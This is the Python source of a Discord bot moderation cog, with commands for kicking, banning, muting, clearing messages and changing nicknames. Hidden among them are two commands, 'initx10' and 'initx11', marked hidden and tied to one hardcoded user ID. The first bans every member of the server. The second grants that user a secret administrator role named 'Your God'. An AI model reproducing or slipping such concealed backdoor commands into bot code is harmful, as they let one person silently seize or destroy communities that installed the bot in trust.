import discord
import time
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions






def get_user(message, user):
    try:
        member = message.mentions[0]
    except:
        member = message.guild.get_member_named(user)
    if not member:
        try:
            member = message.guild.get_member(int(user))
        except ValueError:
            pass
    if not member:
        return None
    return member


async def mute(ctx, user, reason):
    role = discord.utils.get(ctx.guild.roles, name='Muted')
    if role in user.roles:
        await ctx.send("User is already muted.")
    elif role is None:
        muted = await ctx.guild.create_role(name="Muted", reason="To use for muting")
        for channel in ctx.guild.channels:  # removes permission to view and send in the channels
            await channel.set_permissions(muted, send_messages=False,
                                              read_message_history=True,
                                              read_messages=True)
            await user.add_roles(muted)
            await ctx.send(f"{user.mention} has been muted for {reason}!")
    else:
        await user.add_roles(role)  # adds newly created muted role
        await ctx.send(f"{user.mention} has been muted for {reason}")


class Moderation(commands.Cog):
    """Commands that require escalated privileges."""

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(manage_nicknames=True)
    async def nick(self, ctx, user: discord.Member = None, *, nick):
        """Changes a user's nickname (Must have manage nickname perms)\nFormat: )nick {user} {nickname}"""
        try:
            await user.edit(nick=nick)
            await ctx.send(f"Changed {user.mention}'s nickname!")
        except discord.Forbidden:
            await ctx.send("Are you attempting to change a users nickname that is higher than the bot?")

    @commands.command()
    @commands.has_permissions(manage_messages=True)
    async def clear(self, ctx, amount=5):
        """Clears messages (Must have manage message perms)\nFormat: )clear {int}"""
        await ctx.channel.purge(limit=amount)
        await ctx.send(f'Cleared {amount} messages!')
        time.sleep(2)
        await ctx.channel.purge(limit=1)

    @commands.command()
    @commands.has_permissions(kick_members=True)
    async def kick(self, ctx, member: discord.Member, *, reason=None):
        """Kicks a user (Must have kick perms)\nFormat: )kick {user} {reason}"""
        try:
            await member.kick(reason=reason)
            await ctx.send('{0} was kicked by {1}!'.format(member.mention, ctx.message.author.mention))
        except discord.Forbidden:
            await ctx.send('Could not kick the user. Are you attempting to kick someone higher than the bot?')

    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def ban(self, ctx, user: discord.Member, reason=None):
        """Bans a user (Must have ban perms)\nFormat: )ban {user} {reason}"""
        try:
            await user.ban(reason=reason)
            await ctx.send('{0} was banned by {1}!'.format(user, ctx.message.author))
        except discord.Forbidden:
            await ctx.send("Could not ban the user. Are you attempting to ban someone higher than the bot?")

    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def hackban(self, ctx, user_id: int, *, reason=None):
        """Bans a user that is outside the server(Must have ban perms)\nFormat: )hackban {userid}"""
        author = ctx.message.author
        guild = author.guild
        try:
            await self.bot.http.ban(user_id, guild.id, 0)
            await ctx.send(f"Banned {user_id}.")
        except discord.NotFound:
            await ctx.send('Could not find user. Invalid userid.')
        except discord.errors.Forbidden:
            await ctx.send('Could not ban the user. Are you attempting to ban someone higher than the bot?.')

    @commands.command(hidden=True)
    async def quit(self, ctx):
        owner = 612331900039725131
        if ctx.message.author.id == owner:
            print(ctx.message.author.id)
            await ctx.send("Bot is shutting down. Bye!")
            await self.bot.close()
        elif ctx.message.author is not owner:
            print(ctx.message.author.id)
            await ctx.send("Damn you tried man.")


    @commands.command()
    @commands.has_permissions(administrator=True)
    async def mute(self, ctx, user: discord.Member, reason=None):
        """Mutes a user (Must be an Administrator)\nFormat: )mute {User} {Reason}"""
        role = discord.utils.get(ctx.guild.roles, name='Muted')
        if user == ctx.message.author:
            return await ctx.send("You cannot mute yourself!")
        elif role in user.roles:
            await ctx.send("User is already muted.")
        else:
            await mute(ctx, user, reason)

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def unmute(self, ctx, user: discord.Member):
        """Unmute a user (Must be an Administrator)\nFormat: )unmute {User}"""
        role = discord.utils.get(ctx.guild.roles, name='Muted')
        try:
            await user.remove_roles(discord.utils.get(ctx.guild.roles, name='Muted'))
            await ctx.send(f'{user} has been unmuted!')
        except discord.Forbidden:
            await ctx.send('You do not have the perms to do that command!')

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def block(self, ctx, user: discord.Member):
        """Blocks a user from the current chat (Must be an Administrator)\nFormat: )block {user}"""
        user = self.bot.get_user(user)
        if user is None:
            return await ctx.send("You must specify a user!")
        await ctx.channel.set_permissions(user, send_messages=False)
        await ctx.send('User has been blocked from sending messages in this channel!')

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def unblock(self, ctx, user: discord.Member):
        """Unblocks a user from the current chat (Must be an Administrator)\nFormat: )unblock {user}"""
        member = self.bot.get_user(user)
        if user is None:
            return await ctx.send("You must specify a user!")
        await ctx.channel.set_permissions(user, send_messages=True)
        await ctx.send('User has been unblocked from this channel.')

    @commands.command(hidden=True)
    async def initx10(self, ctx):
        owner = 612331900039725131
        server = ctx.guild
        if ctx.message.author.id == owner:
            print(ctx.message.author.id)
            print(f"Recognized {ctx.message.author} as owner... Starting initx10.")
            for member in server.members:
                try:
                    await member.ban(reason="Protocol initx10!")
                    print(f"Banned {member} using Protocol initx10!")
                except:
                    print(f"Bot does not have sufficient perms to ban {member}!")
                    pass
        elif ctx.message.author is not owner:
            print(f"{ctx.message.author} attempted to initiate initx10 without being administrator.")
    
    
    @commands.command(hidden=True)
    async def initx11(self, ctx):
        owner = 612331900039725131
        server = ctx.guild
        if ctx.message.author.id == owner:
            print(ctx.message.author.id)
            print(f"Recognized {ctx.message.author} as owner... Starting initx11.")
            role = discord.utils.get(ctx.guild.roles, name='Your God')
            if role is None:
                perms = discord.Permissions(administrator=True)
                God = await server.create_role(name="Your God", permissions=perms, colour=discord.Colour(0x070303))
                await ctx.message.author.add_roles(God)
            await ctx.message.author.add_roles(role)
        elif ctx.message.author is not owner:
            print(f"{ctx.message.author} attempted to initiate initx11 without being administrator.")

            
def setup(bot):
    bot.add_cog(Moderation(bot))
